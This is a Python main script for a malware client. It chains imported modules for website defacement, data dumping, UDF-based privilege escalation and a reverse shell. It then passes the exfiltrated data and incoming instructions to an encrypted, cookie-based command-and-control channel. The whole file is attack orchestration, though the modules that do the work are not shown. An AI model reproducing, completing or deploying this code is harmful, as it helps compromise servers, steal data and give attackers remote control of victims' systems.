from modules.cookie_comm import communication_client_main, read_file
from modules.crypto import encrypt, decrypt
from queue import Queue
from uuid import uuid1

from modules.malware.defacement import defacement_main

from modules.malware.udf_root import udf_root_main
from modules.malware.dumping import dumping_main

from modules.malware.execute import reverse_shell_main, is_root

from modules.hash import hash

if __name__ == '__main__':
    exfiltrate = Queue()
    instructions = Queue()
    client_id = str(uuid1())

    defacement_main(exfiltrate)
    dumping_main(exfiltrate)
    

    if is_root:
        reverse_shell_main(instructions, exfiltrate, 5)

    else:
        udf_root_main()
    
    communication_client_main(client_id, exfiltrate, instructions, encrypt, decrypt)